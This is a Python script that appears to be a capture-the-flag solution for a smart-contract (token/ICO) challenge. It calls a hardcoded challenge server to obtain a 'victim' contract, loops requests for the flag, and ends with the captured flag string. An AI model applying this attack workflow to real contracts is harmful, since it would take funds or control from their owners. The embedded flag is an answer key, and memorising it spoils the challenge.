import requests
from abi import token_abi, ico_abi

server_ip = 'http://142.93.103.129:3001'

def get_balance(wallet,in_ether):
    "wallet - address, in_ether - boolean"
    r = requests.post(server_ip+'/get_balance', data={'wallet': wallet, 'in_ether':in_ether})
    print(r.text)

def new_cold_wallet(password):
    "password - string"
    r = requests.post(server_ip+'/new_cold_wallet', data={'password':password})
    print(r.text)
    return r.text

def send_money(_from, password, to, amount):
    "from - address, password - string, to - address, amount - amount in wei"
    r = requests.post(server_ip+'/send_money', data={'from':_from, 'password':password, 'to':to, 'amount':amount})
    print(r.text)
    return r

def call_contract(address, abi, _from, password, value, _type, gas, gasPrice, func, params):
    "address - contract_address, abi - json array, from - address, password - string, func - function to call, params - json array, value - msg.value, type - standard|call, gas - int, gasPrice - int"
    r = requests.post(server_ip+'/call_contract', json={'address':address, 'abi':abi, 'from':_from, 'password':password, 'func':func, 'value':value, 'type':_type, 'gas':gas, 'gasPrice':gasPrice, 'params':params})
    print(r.text)
    return r

def get_flag(target, attacker, password):
    "target - victim_address_where_attacker_is_vip, attacker - attacker_address, password - attacker_password"
    r = requests.post(server_ip+'/get_flag', data={'target':target,'attacker':attacker,'password':password})
    return r.text # flag

def get_victim(attacker):
    r = requests.post(server_ip+'/get_victim', data={'attacker':attacker})
    return r.text # contract
    

class Token:

    def __init__(self, contract, wallet, password, abi=token_abi):
        self.contractAddress = contract
        self.wallet = wallet
        self.password = password
        self.abi = abi

    def getPublic(self, _property) : 
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'call', '100000000', '1000000000', _property, [])

    def allowance(self, owner, spender):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'call', '100000000', '1000000000', 'allowance', [owner, spender])

    def balanceOf(self, owner):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'call', '100000000', '1000000000', 'balanceOf', [owner])

    def approve(self, spender, value):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'approve', [spender, value])

    def burn(self, value):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'burn', [value])

    def decreaseApproval(self, spender, subtractedValue) :
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'decreaseApproval', [spender, subtractedValue])

    def enableTransfers(self) :
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'enableTransfers', [])

    def increaseApproval(self, spender, addedValue):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'increaseApproval', [spender,addedValue])

    def renounceOwnership(self):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'renounceOwnership', [])

    def setCrowdsaleAddress(self, addr):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'setCrowdsaleAddress', [addr])

    def transfer(self, to, value):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'transfer', [to,value])

    def transferFrom(self, _from, to, value):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'transferFrom', [_from,to,value])

    def transferOwnership(self, newOwner):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'transferOwnership', [newOwner])


class ICO:

    def __init__(self, contract, wallet, password, abi=ico_abi):
        self.contractAddress = contract
        self.wallet = wallet
        self.password = password
        self.abi = abi

    def getPublic(self, _property) : 
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'call', '100000000', '1000000000', _property, [])

    def getInvestor(self, address):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'call', '100000000', '1000000000', 'investors', [address])

    def buyTokens(self,msgValue):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, msgValue, 'standard', '100000000', '1000000000', 'buyTokens', [])

    def changeWalletAddress(self, wallet):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'changeWalletAddress', [wallet])

    def registerPreSaleInvestment(self, investor, amount):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'registerPreSaleInvestment', [investor, amount])

    def renounceOwnership(self):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'renounceOwnership', [])

    def transferOwnership(self, newOwner):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'transferOwnership', [newOwner])
    
    def whitelistInvestor(self, investor):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'whitelistInvestor', [investor])

    def whitelistInvestors(self, investors):
        return call_contract(self.contractAddress, self.abi, self.wallet, self.password, '', 'standard', '100000000', '1000000000', 'whitelistInvestors', [[investors]])


import json 

password = '12345'
wallet = new_cold_wallet(password) # '0xB0E9f4C629C86c921812ee2cB60d02C1f7405d89'
contractAddresses = json.loads(get_victim(wallet))
tokAdd = contractAddresses['token']
icoAdd = contractAddresses['ico']

owner = '0x32fe35D5F655c0aB47F3C1D140d3b7f95C637403'
icoContract = ICO(icoAdd, wallet, password, ico_abi)
tokenContract = Token(icoAdd, wallet, password, token_abi)

for i in range(256):
    get_flag(icoAdd, wallet, password)

# DCTF{905d4e658026c948db460ef562779b222080aa9cd331910745d553eaca5d0e16}